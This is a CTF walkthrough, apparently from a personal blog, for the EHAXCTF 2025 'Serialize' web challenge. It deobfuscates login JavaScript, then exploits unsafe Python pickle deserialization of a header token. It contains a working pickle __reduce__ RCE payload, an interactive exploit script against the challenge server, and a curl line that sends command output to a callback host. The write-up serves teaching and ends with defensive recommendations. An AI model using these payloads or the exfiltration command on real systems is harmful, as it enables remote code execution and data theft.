---
title: EHAXCTF 2025
date: 2025-02-18
draft: false
tags:
  - ctf
  - learning
categories:
  - ctf
keywords:
  - ctf
  - learning
---
# Serialize Challenge Walkthrough

## Challenge

![Screenshot showing challenge description](Pasted%20image%2020250218144551.png)

The challenge tests the following skills:
- JavaScript deobfuscation and analysis
- Python pickle deserialization exploitation
- Command injection techniques
- Data exfiltration methods

Required background knowledge includes:
- JavaScript debugging
- Python pickle serialization
- Command injection techniques
- Web request manipulation

## Initial Analysis

The challenge presents a login page with client-side JavaScript validation. Inspection of the source code reveals heavily obfuscated JavaScript:

```html
<body>
    <form class="login-form">
        <h2>Login to get flag</h2>
        <input type="text" id="username" placeholder="Enter your username" required>
        <input type="password" id="password" placeholder="Enter your password" required>
        <button type="submit">Login</button>
    </form>

    <script>[][(![]+[])[+[]]... redacted
```
The full HTML source code is available in [this gist](https://gist.github.com/jsnv-dev/fdf50b45b97ffa8f0083adfda7d11429)

Browser developer tools debugging reveals an anonymous function containing authentication logic:

```js
function anonymous() {
  return 'const _0x3645b3=_0x4842;function _0x4842(_0x19d358,_0x49968c){const _0x2ad82b=_0x2ad8();return _0x4842=function(_0x484299,_0x4da982){_0x484299=_0x484299-0x1f1;let _0x4c8636=_0x2ad82b[_0x484299];return _0x4c8636;},_0x4842(_0x19d358,_0x49968c);}(function(_0x4ff4ae,_0x561f72){const _0x2b38fa=_0x4842,_0x2d072e=_0x4ff4ae();while(!![]){try{const _0x20be76=parseInt(_0x2b38fa(0x1f5))/0x1+-parseInt(_0x2b38fa(0x206))/0x2*(parseInt(_0x2b38fa(0x205))/0x3)+parseInt(_0x2b38fa(0x202))/0x4+-parseInt(_0x2b38fa(0x1ff))/0x5+-parseInt(_0x2b38fa(0x1fd))/0x6*(parseInt(_0x2b38fa(0x201))/0x7)+-parseInt(_0x2b38fa(0x1f2))/0x8+parseInt(_0x2b38fa(0x1fa))/0x9*(parseInt(_0x2b38fa(0x1f9))/0xa);if(_0x20be76===_0x561f72)break;else _0x2d072e[\'push\'](_0x2d072e[\'shift\']());}catch(_0x1a16c9){_0x2d072e[\'push\'](_0x2d072e[\'shift\']());}}}(_0x2ad8,0xbdbb4));const form=document[_0x3645b3(0x1fe)](_0x3645b3(0x200));async function submitForm(_0x361a11){const _0xbae53f=_0x3645b3,_0x261004=await fetch(_0xbae53f(0x203),{\'method\':\'POST\',\'body\':JSON[_0xbae53f(0x208)](_0x361a11),\'headers\':{\'Content-Type\':_0xbae53f(0x1f4)}});window[_0xbae53f(0x1f7)]=\'/welcome.png\';}form[_0x3645b3(0x1f8)](_0x3645b3(0x1f6),_0x3f6721=>{const _0x43e2d2=_0x3645b3;_0x3f6721[_0x43e2d2(0x1f1)]();const _0x451641=document[_0x43e2d2(0x204)](_0x43e2d2(0x1fc)),_0x12fab0=document[\'getElementById\'](_0x43e2d2(0x207));_0x451641[_0x43e2d2(0x1fb)]==\'dreky\'&&_0x12fab0[\'value\']==\'ohyeahboiiiahhuhh\'?submitForm({\'user\':_0x451641[\'value\'],\'pass\':_0x12fab0[_0x43e2d2(0x1fb)]}):alert(_0x43e2d2(0x1f3));});function _0x2ad8(){const _0x5aa71f=[\'2115056nOLZur\',\'Invalid\\x20username\\x20or\\x20password\',\'application/json\',\'206204rQEQbe\',\'submit\',\'location\',\'addEventListener\',\'4252550HZZkfV\',\'18etmbIj\',\'value\',\'username\',\'43194hBWQRV\',\'querySelector\',\'5935145KtOSgP\',\'.login-form\',\'238aTVShg\',\'6015272rbWZkU\',\'/login\',\'getElementById\',\'15cVIXSQ\',\'34886FmgdQH\',\'password\',\'stringify\',\'preventDefault\'];_0x2ad8=function(){return _0x5aa71f;};return _0x2ad8();}'
```

Deobfuscated JavaScript revealing credentials and login endpoint:

```js
const form = document.querySelector('.login-form');

// Main form submission handler
form.addEventListener('submit', (e) => {
    e.preventDefault();
    const username = document.getElementById('username');
    const password = document.getElementById('password');

    // Client-side credential check
    if (username.value == 'dreky' && password.value == 'ohyeahboiiiahhuhh') {
        submitForm({
            'user': username.value,
            'pass': password.value
        });
    } else {
        alert('Invalid username or password');
    }
});

// Submit function that sends credentials to server
async function submitForm(credentials) {
    const response = await fetch('/login', {
        'method': 'POST',
        'body': JSON.stringify(credentials),
        'headers': {
            'Content-Type': 'application/json'
        }
    });
    window.location = '/welcome.png';
}
```

Discovered credentials:
- Username: `dreky`
- Password: `ohyeahboiiiahhuhh`

## Technical Deep Dive

A POST request to the `/login` endpoint using the discovered credentials yields:

![Successful login request/response](Pasted%20image%2020250218145247.png)

The response redirects to a new page:

![First flag part reveal](Pasted%20image%2020250218145327.png)

Source code reveals a CSS file reference:

![CSS file reference highlight](Pasted%20image%2020250218145421.png)

The CSS file contents expose additional information:

![CSS file contents showing new endpoint](Pasted%20image%2020250218145502.png)

The discovered endpoint `/t0p_s3cr3t_p4g3_7_7` returns a response with an interesting header:

![Response with X-Serial-Token header](Pasted%20image%2020250218145613.png)

Using CyberChef of the token reveals like a Python pickle serialization. The structure suggests it's trying to call `posix.system('dreky')`:

![CyberChef base64 decode output](Pasted%20image%2020250218145651.png)

## Solution 

Analysis of the X-Serial-Token reveals Python pickle serialization. Python's pickle module serializes Python objects into a byte stream for storage or transmission. However, pickle deserialization executes code during object reconstruction, making it dangerous when processing untrusted data.

The original token decoded shows:
```python
{
    'posix': 'system',
    'command': 'dreky'
}
```

This structure indicates the server deserializes the token and executes system commands. The vulnerability lies in pickle's `__reduce__` method, which allows arbitrary code execution during deserialization. A malicious payload can be crafted:

```python
import pickle
import base64
import posix

class Evil:
    def __reduce__(self):
        # Returns a tuple of (callable, args) that pickle uses for reconstruction
        # When deserialized, it executes: posix.system(command)
        return (posix.system, ('cat flag.txt',))

payload = pickle.dumps(Evil())
print(base64.b64encode(payload).decode())
```

Sending the modified token with `cat flag.txt` reveals different response codes in the `h1` tag, indicating command execution success or failure:

![Modified token request/response](Pasted%20image%2020250218150019.png)

To streamline the exploitation process, a custom Python console script automates payload generation and request handling:

```python
import pickle
import base64
import posix
import requests
from bs4 import BeautifulSoup
import readline

class Evil:
    def __reduce__(self):
        return (posix.system, (cmd,))

def create_payload(command):
    global cmd  # Use global to make cmd accessible in Evil class
    cmd = command
    return base64.b64encode(pickle.dumps(Evil())).decode()

def parse_response(html):
    soup = BeautifulSoup(html, 'html.parser')
    # Find result in h1 tag
    result = soup.find('h1')
    if result:
        return result.text
    return "No result found"

def send_request(token):
    url = "http://chall.ehax.tech:8008/t0p_s3cr3t_p4g3_7_7"
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'X-Serial-Token': token
    }

    try:
        response = requests.get(url, headers=headers)
        return response.text
    except requests.RequestException as e:
        return f"Error making request: {str(e)}"

def main():
    print("-" * 50)

    while True:
        try:
            command = input("Command > ").strip()

            if command.lower() == 'exit':
                break

            if not command:
                continue

            # Create payload
            token = create_payload(command)
            print(f"\nGenerated Token: {token}")

            # Send request and get response
            response = send_request(token)

            # Parse and display result
            result = parse_response(response)
            print(f"Result: {result}\n")

        except KeyboardInterrupt:
            print("\nExiting...")
            break
        except Exception as e:
            print(f"Error: {str(e)}\n")

if __name__ == "__main__":
    main()
```

![Console script output](Pasted%20image%2020250218150337.png)

Command execution verification requires output exfiltration since responses only show exit codes. Using an HTTP callback service captures command output:

```python
# Exfiltration payload
cmd = f'cmd=`{command}` && curl "https://callback.domain/?=$(cmd)"'
```

The callback listener demonstrates successful command execution:

![](Pasted%20image%2020250218150408.png)

![Callback listener showing command output](Pasted%20image%2020250218150514.png)

This exploitation method combines deserialization vulnerability with command injection and data exfiltration techniques. The pickle vulnerability provides initial code execution, while DNS/HTTP callbacks bypass output restrictions.
## Successful Exploitation

The first flag part (`oh_h3l1_`) enables targeted file searching. A grep command reveals the complete flag:

![Flag exfiltration output](Pasted%20image%2020250218150553.png)

Final flag: `E4HX{oh_h3l1_n44www_y0u_8r0k3_5th_w4l1}`

## Security Implications

This challenge demonstrates critical vulnerability patterns:
1. Client-side only authentication
2. Unsafe deserialization of user-controlled data
3. Command injection leading to RCE
4. Data exfiltration via DNS/HTTP requests
## Security Recommendations
- Server-side authentication implementation
- Avoiding pickle deserialization of untrusted data
- Input validation and sanitization